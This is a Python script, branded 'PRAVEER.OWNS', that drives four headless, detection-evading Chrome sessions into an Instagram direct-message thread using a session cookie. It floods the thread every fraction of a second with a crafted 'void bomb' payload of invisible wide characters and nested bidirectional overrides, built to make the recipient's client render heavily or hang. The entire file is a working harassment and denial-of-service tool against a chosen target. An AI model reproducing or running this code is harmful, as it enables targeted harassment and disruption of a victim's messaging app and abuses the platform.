# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (CLEAN-KILL V15)
# 📅 STATUS: MINIMAL-HEAVY | 4-AGENT | DOCKER-READY

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- CONFIGURATION ---
THREADS = 4             # ✅ 4 Agents per machine
TOTAL_DURATION = 25000 
BURST_SPEED = (0.1, 0.2)
SESSION_LIMIT = 120 

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()
sys.stdout.reconfigure(encoding='utf-8')

def get_minimal_heavy_payload():
    """Generates a clean-looking but rendering-heavy invisible wall."""
    u_id = random.randint(100, 999)
    # \u2800 is an invisible character that has 'physical' width in the UI
    clean_void = "\u2800" * 45 
    glue = "\u2060" # Unbreakable word joiner
    
    # 👑 MINIMAL BRANDING
    header = f"👑 𝖯𝖱𝖠𝖵𝖤𝖤𝖱 𝖯𝖠𝖯𝖠 👑 [ID:{u_id}]"
    
    # 🏗️ THE 'VOID' BOMB
    # We use nested directionals inside invisible wide characters
    body = []
    for i in range(160):
        # Nested BIDI logic hidden inside white space
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        body.append(f"{prefix}{clean_void}{glue}")
        
    return f"{header}\n{glue.join(body)}".strip()[:9990]

def log_status(agent_id, msg):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] M-{os.environ.get('MACHINE_ID')} Agent {agent_id}: {msg}", flush=True)

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        
        # Lightweight Mobile Emulation
        mobile_emulation = {
            "deviceMetrics": { "width": 360, "height": 640, "pixelRatio": 2.0 },
            "userAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        }
        chrome_options.add_experimental_option("mobileEmulation", mobile_emulation)
        
        temp_dir = os.path.join(tempfile.gettempdir(), f"clean_node_{agent_id}_{int(time.time())}")
        chrome_options.add_argument(f"--user-data-dir={temp_dir}")
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Android", fix_hairline=True)
        driver.custom_temp_path = temp_dir
        return driver

def adaptive_inject(driver, element, text):
    try:
        driver.execute_script("arguments[0].focus(); document.execCommand('insertText', false, arguments[1]);", element, text)
        element.send_keys(Keys.ENTER)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    global_start = time.time()
    while (time.time() - global_start) < TOTAL_DURATION:
        driver = None
        session_start = time.time()
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(8) 
            
            box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
            adaptive_inject(driver, box, "🚀 MATRIX NODE ONLINE")

            while (time.time() - session_start) < SESSION_LIMIT:
                payload = get_minimal_heavy_payload()
                if adaptive_inject(driver, box, payload):
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    log_status(agent_id, f"Hit {GLOBAL_SENT}")
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            if driver: driver.quit()
            shutil.rmtree(getattr(driver, 'custom_temp_path', ''), ignore_errors=True)
            time.sleep(2)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
